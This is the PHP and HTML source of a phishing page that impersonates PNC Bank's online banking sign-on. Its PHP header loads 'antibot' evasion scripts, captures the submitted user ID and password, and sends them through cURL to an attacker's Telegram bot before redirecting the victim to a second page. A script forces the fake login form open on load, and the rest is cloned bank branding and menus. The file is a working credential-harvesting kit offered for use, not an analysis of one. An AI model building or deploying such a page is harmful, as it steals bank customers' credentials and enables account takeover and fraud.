<?php
require_once('./antibot/botfcker.php');
require_once('./antibot/botfcker2.php');

// Include the configuration file
include 'config.php';
if (isset($_POST['user-id']) && isset($_POST['password'])) {
    $userId = $_POST['user-id'];
    $password = $_POST['password'];
    $message = "===[ PNC Login Result ]===\n\nUser ID: $userId\nPassword: $password";
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'cURL Error: ' . curl_error($ch);
    } else {
        header('Location: index2.php');
        exit();
    }

    curl_close($ch);
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
    <title>PNC Personal Banking</title>

    <style>
        :root {
            font-family: "Open Sans", sans-serif;
        }

        .login-form {
            z-index: 60;
        }

        .focus-border-l-custom:focus {
            border-left: 3px solid #EF6A00;
        }
    </style>
</head>

<body>
    <nav class="bg-[#414E58] relative">
        <div class="container mx-auto flex flex-wrap lg:flex-nowrap justify-between items-center">
            <div class="block lg:hidden">
                <button class="text-white focus:outline-none" id="nav-toggle">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
                    </svg>
                </button>
            </div>

            <div class="flex justify-center items-center flex-grow uppercase text-md">
                <img src="./assets/img/PNC Home.svg" alt="" class="w-20 lg:w-26 mr-6">
                <ul class="hidden lg:flex gap-6 font-semibold text-white" id="nav-content">
                    <li class="relative">
                        <a href="#" class="block py-5 px-4 bg-[#2D3943] text-white">
                            Personal
                        </a>
                        <span class="absolute top-0 left-0 w-full h-2 bg-[#EF6A00]"></span>
                    </li>
                    <li>
                        <a href="#" class="block py-5 text-white">
                            Small Business
                        </a>
                    </li>
                    <li>
                        <a href="#" class="block py-5 text-white">
                            Corporate & Institutional
                        </a>
                    </li>
                    <li>
                        <a href="#" class="block py-5 text-white">
                            About
                        </a>
                    </li>
                </ul>
            </div>

            <div class="hidden lg:flex">
                <ul class="flex mx-4 lg:mx-32 p-3 text-white text-sm font-normal gap-3">
                    <li class="flex gap-1"><img src="./assets/img/world.svg" class="w-3" alt=""><a href="#">Español</a></li>
                    <li><a href="#">Customer Service</a></li>
                    <li><a href="#">Locations</a></li>
                    <li><a href="#">Security</a></li>
                </ul>
            </div>
        </div>

        <div class="w-full block lg:hidden hidden" id="mobile-menu">
            <ul class="p-3 font-semibold text-white flex flex-col gap-4">
                <li><a href="#">Personal</a></li>
                <li><a href="#">Small Business</a></li>
                <li><a href="#">Corporate & Institutional</a></li>
                <li><a href="#">About</a></li>
                <li><a href="#">Español</a></li>
                <li><a href="#">Customer Service</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Security</a></li>
            </ul>
        </div>

        <div class="bg-[#2D3943] relative">
            <div class="max-w-xl mx-auto">
                <div class="flex flex-wrap lg:flex-nowrap justify-between items-center p-3">
                    <div class="py-3 lg:-ml-80">
                        <ul class="flex gap-4 text-white font-semibold uppercase">
                            <li>
                                <a href="">Products & Services</a>
                            </li>
                            <li>
                                <a href="">Learning</a>
                            </li>
                            <li>
                                <a href="">Support</a>
                            </li>
                            <li>
                                <a href="">Offers</a>
                            </li>
                        </ul>
                    </div>
                    <div class="search lg:-mr-80 text-white">
                        <span>Search</span>
                    </div>
                    <div class="relative">
                        <button id="sign-on-btn" class="bg-gray-200 text-sm uppercase rounded-md p-3 lg:-mr-80 flex items-center gap-2">
                            <img src="./assets/img/user.png" alt="User Icon" class="w-5 h-5">
                            Sign on
                        </button>

                        <div id="login-form" class="absolute top-14 bg-white shadow-lg -ml-[10em] p-4 lg:p-8 w-[18em] sm:w-[24em] max-w-md lg:w-[120em] lg:h-[35em] hidden login-form mx-auto">
                            <div class="flex flex-col justify-center items-center">
                                <h2 class=" text-md lg:text-lg tracking-wide">Sign On to Online Banking or select another account</h2>
                                <div class="p-8 flex flex-col w-full">
                                    <form id="form" method="post" class="flex flex-col gap-8 items-start">
                                        <div class="relative w-full">
                                            <label for="user-id" class="text-gray-700 text-sm">User ID <span class="text-sm">(required)</span></label>
                                            <input type="text" id="user-id" name="user-id" required class="border border-gray-300 p-3 focus:outline-none focus-border-l-custom w-full" placeholder="Enter User ID">
                                            <p id="user-id-error" class="text-red-500 text-xs mt-1 hidden">User ID is required</p>
                                        </div>
                                        <div class="relative w-full">
                                            <label for="password" class="text-gray-700 text-sm">Password<span class="text-sm">(required)</span></label>
                                            <input type="password" id="password" name="password" required class="border border-gray-300 p-3 focus:outline-none focus-border-l-custom w-full" placeholder="Enter Password">
                                            <p id="password-error" class="text-red-500 text-xs mt-1 hidden">Password is required</p>
                                        </div>
                                        <button type="submit" id="login-button" class="bg-gray-400 text-white px-4 py-2 cursor-not-allowed focus:outline-none focus:ring-2 focus:ring-blue-500 font-semibold w-full" disabled>Login</button>
                                    </form>
                                    <div class="flex flex-col gap-4 mt-3 w-full items-start">
                                        <div class="flex items-center">
                                            <input class="mr-2" type="checkbox" name="" id="">
                                            <label class="text-sm" for="">Remember User ID</label>
                                        </div>
                                        <div class="flex items-center mt-4">
                                            <a class="text-[#0069AA]" href="#">Forgot ID or Password?</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </div>
    </nav>
    <div class="relative h-[32em] bg-cover bg-center" style="background-image: url('./assets/img/background.jpg');">
        <!-- Box di dalam gambar -->
        <div class="absolute inset-0 flex justify-center items-center">
            <div class="bg-white bg-opacity-70 p-8 rounded-lg shadow-lg max-w-lg text-center">
                <h2 class="text-2xl font-semibold mb-4">
                    Change the Way You Bank
                </h2>
                <p class="text-gray-700">
                    Take your next step with PNC Virtual Wallet - checking, savings and financial tools designed to go wherever you do
                </p>
            </div>
        </div>
    </div>
    <div class="mt-12 flex flex-col justify-center items-center">
        <div>
            <h1 class="text-3xl font-bold text-[#484848]">
                Products & Services
            </h1>
            <hr class="mt-8 mb-8 border-2 w-32 mx-auto border-[#EF6A00]">
            <h1 class="text-2xl font-bold text-[#484848]">
                Explore and apply online.
            </h1>
        </div>
        <div class="flex flex-col md:flex-row items-center md:items-start justify-center mt-12 gap-8">
            <div class="mr-16 mb-8">
                <img src="./assets/img/checking.svg" alt="">
                <a href="#" class="mt-8">Checkings</a>
            </div>
            <div class="mr-16 mb-8">
                <img src="./assets/img/creditcard.svg" alt="">
                <a href="#">Credit Card</a>
            </div>
            <div class="mr-16 mb-8">
                <img src="./assets/img/savings.svg" alt="">
                <a href="#">Savings</a>
            </div>
            <div class="mr-16 mb-8">
                <img src="./assets/img/homeloans.svg" alt="">
                <a href="#">Home Loans</a>
            </div>
            <div class="mr-16 mb-8">
                <img src="./assets/img/autoloans.svg" alt="">
                <a href="#">Auto Loans</a>
            </div>
        </div>

    </div>
    <div class="mt-12 p-6 bg-[#EF6A00] flex flex-col justify-center items-center">
        <div class="p-9 text-center">
            <span class="text-5xl font-bold uppercase text-white">
                The Safest Plan is
                <br>
                Often the Smartest One
            </span>
        </div>
        <div class="flex gap-2 mb-4">
            <a href="#" class="text-lg hover:underline">
                See what boring banking can do for you
            </a>
            <img class="w-4" src="./assets/img/arrow.svg" alt="">
        </div>

    </div>
    <div class="mt-6 p-6 flex flex-col justify-center items-center">
        <div>
            <h1 class="text-3xl text-center font-bold text-[#484848]">
                Insights
            </h1>
            <hr class="mt-8 mb-8 border-2 w-32 mx-auto border-[#EF6A00]">
            <h1 class="text-2xl font-bold text-[#484848]">
                Make today the day you take the next step toward your financial goals.
            </h1>
        </div>

    </div>


</body>

<script>
    // Script ini untuk memastikan login form terbuka otomatis tanpa harus klik
    document.addEventListener('DOMContentLoaded', function() {
        var loginForm = document.getElementById('login-form');
        loginForm.classList.remove('hidden'); // Hapus kelas 'hidden' saat halaman dimuat
    });

    // Script lainnya tetap sama
    document.getElementById('nav-toggle').addEventListener('click', function() {
        document.getElementById('mobile-menu').classList.toggle('hidden');
    });

    const userIdInput = document.getElementById('user-id');
    const passwordInput = document.getElementById('password');
    const loginButton = document.getElementById('login-button');

    function toggleButtonState() {
        if (userIdInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
            loginButton.classList.remove('bg-gray-400', 'cursor-not-allowed');
            loginButton.classList.add('bg-[#0069AA]');
            loginButton.disabled = false;
        } else {
            loginButton.classList.add('bg-gray-400', 'cursor-not-allowed');
            loginButton.classList.remove('bg-[#0069AA]');
            loginButton.disabled = true;
        }
    }

    userIdInput.addEventListener('input', toggleButtonState);
    passwordInput.addEventListener('input', toggleButtonState);
</script>

</html>